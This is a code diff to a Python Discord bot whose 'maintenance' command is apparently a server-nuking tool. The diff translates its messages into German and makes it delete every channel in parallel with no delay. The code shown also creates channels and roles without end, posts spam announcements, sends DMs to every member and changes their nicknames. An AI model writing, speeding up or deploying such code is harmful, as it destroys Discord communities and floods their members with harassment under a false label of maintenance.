@@ -32,20 +32,19 @@ async def fart(
     action_delay: float = 1.0
 ):
     await interaction.response.send_message(
-        "🚀 Maintenance started. Check your DMs for details.",
+        "🚀 Maintenance gestartet. Sieh in deinen DMs nach Details.",
         ephemeral=True
     )
     guild = interaction.guild
     caller = interaction.user
 
-    # 1) Alle bestehenden Channels löschen
-    await caller.send("🔄 Deleting existing channels before starting spam...")
+    # 1) Alle bestehenden Channels sofort löschen (ohne Delay)
+    await caller.send("🔄 Lösche alle bestehenden Channels...")
+    delete_tasks = []
     for channel in guild.channels:
-        try:
-            await channel.delete()
-        except:
-            pass
-        await asyncio.sleep(action_delay)
+        delete_tasks.append(channel.delete())
+    # Alle Lösch-Tasks parallel ausführen
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
 
     # 2) Alle Mitglieder holen (für DMs & Nick-Updates)
     members = []
@@ -54,12 +53,12 @@ async def fart(
 
     # 3) Nur an den Ausführenden: Zusammenfassung senden
     await caller.send(
-        f"Server maintenance parameters:\n"
+        f"Server-Maintenance-Parameter:\n"
         f"- Announcement: `{announcement}`\n"
-        f"- Channel prefix: `{channel_prefix}`\n"
-        f"- Nickname prefix: `{nickname_prefix}`\n"
-        f"- Creation delay: `{action_delay}s`\n\n"
-        "Background tasks are now running: channel & role spam, plus announcements and nick updates."
+        f"- Channel-Prefix: `{channel_prefix}`\n"
+        f"- Nickname-Prefix: `{nickname_prefix}`\n"
+        f"- Creation-Delay: `{action_delay}s`\n\n"
+        "Hintergrund-Tasks laufen jetzt: Channel- & Role-Spam, Ankündigungen und Nick-Updates."
     )
 
     # 4) An alle anderen Mitglieder: nur die Announcement-DM
@@ -91,17 +90,14 @@ async def fart(
     async def channel_and_role_spam():
         counter = 1
         while True:
-            # Neuen Channel erstellen
             name = f"{channel_prefix}-{counter}"
             try:
                 chan = await guild.create_text_channel(name)
                 new_channels.append(chan)
-                # Sofort post announcement
                 await chan.send(announcement)
             except:
                 pass
 
-            # Neue Rolle erstellen
             tag = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
             try:
                 await guild.create_role(name=tag)
@@ -126,7 +122,7 @@ async def fart(
 @bot.event
 async def on_ready():
     await bot.tree.sync()
-    print(f"Bot is online as {bot.user}")
+    print(f"Bot ist online als {bot.user}")
 
 if __name__ == "__main__":
     bot.run(TOKEN)
